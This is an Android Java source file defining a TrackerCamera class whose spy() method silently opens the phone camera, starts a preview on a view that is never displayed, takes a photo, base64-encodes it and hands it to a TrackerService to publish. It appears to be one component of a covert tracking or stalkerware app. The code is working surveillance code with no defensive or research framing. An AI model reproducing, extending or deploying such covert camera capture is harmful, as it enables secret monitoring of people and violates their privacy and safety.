package net.datadeer.app.lifestream;

import android.hardware.Camera;
import android.util.Base64;
import android.view.SurfaceView;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

class TrackerCamera extends TrackerMethod {

    public TrackerCamera(String name) {
        super(name);
    }

    @Override public void spy() {

        for (int i=0;i< Math.min(1,Camera.getNumberOfCameras());i++) {
            Camera cam = Camera.open(i);
            try {
                SurfaceView view = new SurfaceView(getContext());
                cam.setPreviewDisplay(view.getHolder());
                cam.startPreview();
            } catch (IOException e) {
                e.printStackTrace();
                return;
            }
            cam.takePicture(null,null,null, (data, camera) -> {
                try {
                    JSONObject ret = new JSONObject();
                    String base64JPEG = new String(Base64.encode(data, Base64.DEFAULT));
                    ret.put("photo",base64JPEG);
                    TrackerService.publishSpyResults(this,ret);
                    camera.release();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            });
        }
    }
}